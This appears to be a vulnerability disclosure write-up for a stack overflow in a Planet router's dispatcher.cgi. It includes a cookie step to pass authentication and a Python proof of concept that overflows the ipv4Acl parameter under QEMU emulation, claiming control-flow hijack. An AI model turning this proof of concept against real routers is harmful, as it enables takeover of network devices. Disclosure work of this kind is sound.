# web_acl_ipv4BasedAceAdd_post-ipv4Acl

I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_acl_ipv4BasedAceAdd  contains a stack overflow vulnerability.

The stack overflow can be triggered by ipv4Aclkey value, which leads to a strcpy stack overflow.

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```

ï»¿The content of the **poc**.py file is as follows:

```json
import os


a = 0xC0E
var_name = "ipv4Acl"
b = 'a' * 0x300

poc_content = f"&cmd={a}&{var_name}={b}"
with open('poc', 'w') as f:
    f.write(poc_content)


command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)


```

Through IDA, it can be seen that the stack space is 0xb0.

Through the above image, we can see that we have overflowed to 0x318 and successfully hijacked the control flow. If necessary, more can be overflowed.
